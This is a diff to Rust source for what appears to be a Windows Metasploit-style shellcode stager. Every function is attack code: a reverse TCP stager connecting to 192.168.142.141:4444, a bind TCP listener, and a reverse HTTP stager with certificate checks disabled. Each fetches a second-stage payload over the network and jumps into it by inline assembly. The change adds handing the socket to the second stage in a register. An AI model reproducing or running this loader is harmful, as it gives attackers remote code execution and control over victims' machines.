@@ -3,9 +3,10 @@
 use bindings::windows::win32::system_services::VirtualAlloc;
 use byteorder::{BigEndian, ReadBytesExt};
 use std::io::Cursor;
+use std::os::windows::prelude::*;
 use std::{error::Error, u32};
 use tokio::io::AsyncReadExt;
-use tokio::net::{TcpStream, TcpListener};
+use tokio::net::{TcpListener, TcpStream};
 async fn reverse_tcp(address: &str) -> Result<(), Box<dyn Error>> {
     let mut stream = TcpStream::connect("192.168.142.141:4444").await?;
     let mut stage2_len_buf = [0u8; 4];
@@ -21,7 +22,7 @@ async fn reverse_tcp(address: &str) -> Result<(), Box<dyn Error>> {
 
     // execute shellcode
     println!("before do shellcode");
-    do_shellcode(stage2_buf);
+    do_shellcode(stage2_buf, None);
     println!("after do shellcode");
     Ok(())
 }
@@ -37,18 +38,17 @@ async fn handle_tcp(stream: &mut TcpStream) -> Result<(), Box<dyn Error>> {
     stream.read_exact(&mut stage2_buf).await?;
 
     println!("got stage2 len: {}", stage2_buf.len());
-
-    // drop(stream);
-    // drop(listener);
-    // execute shellcode
+    // lib\msf\core\payload\windows\x64\bind_tcp_x64.rb
+    // save socket to rsi, stage 2 code need it.
+    let raw_socket = stream.as_raw_socket();
     println!("before do shellcode");
-    do_shellcode(stage2_buf);
+    do_shellcode(stage2_buf, Some(raw_socket));
     println!("after do shellcode");
     Ok(())
 }
 
-async fn bind_tcp() -> Result<(), Box<dyn Error>> {
-    let listener = TcpListener::bind("0.0.0.0:4445").await?;
+async fn bind_tcp(addr: &str) -> Result<(), Box<dyn Error>> {
+    let listener = TcpListener::bind(addr).await?;
     loop {
         println!("listening.......");
         let (mut stream, _) = listener.accept().await?;
@@ -63,7 +63,6 @@ async fn bind_tcp() -> Result<(), Box<dyn Error>> {
             //     // tracing::info!("an error occurred; error = {:?}", e);
             // }
         });
-
     }
     Ok(())
 }
@@ -104,9 +103,11 @@ async fn reverse_http() -> Result<(), Box<dyn Error>> {
     let url = format!("{}{}", url, checksum);
     dbg!(&url);
     let five_seconds = Duration::new(5, 0);
-    let client = reqwest::ClientBuilder::new().timeout(five_seconds).danger_accept_invalid_certs(true).build()?;
+    let client = reqwest::ClientBuilder::new()
+        .timeout(five_seconds)
+        .danger_accept_invalid_certs(true)
+        .build()?;
     // client;
-
 
     // .danger_disable_hostname_verification().build().unwrap();
     let body = client.get(&url).send().await?.bytes().await?;
@@ -114,7 +115,7 @@ async fn reverse_http() -> Result<(), Box<dyn Error>> {
 
     println!("reverse_http, got stage2 len: {}", stage2_buf.len());
     println!("before do shellcode");
-    do_shellcode(stage2_buf.to_vec());
+    do_shellcode(stage2_buf.to_vec(), None);
     println!("after do shellcode");
     Ok(())
 }
@@ -123,11 +124,11 @@ async fn reverse_http() -> Result<(), Box<dyn Error>> {
 async fn main() -> Result<(), Box<dyn Error>> {
     // reverse_tcp("").await?;
     // reverse_http().await?;
-    bind_tcp().await?;
+    bind_tcp("0.0.0.0:4446").await?;
     return Ok(());
 }
 
-fn do_shellcode(shellcode: Vec<u8>) {
+fn do_shellcode(shellcode: Vec<u8>, socket: Option<RawSocket>) {
     let contents = shellcode;
     let flen = contents.len();
 
@@ -152,6 +153,9 @@ fn do_shellcode(shellcode: Vec<u8>) {
         // if set_breakpoint {
         //     asm!("int 3");
         // }
+        if socket.is_some() {
+            asm!("mov rdi, {}", in(reg) socket.unwrap());
+        }
         asm!("jmp {}",in(reg) jmp_target)
     };
 }
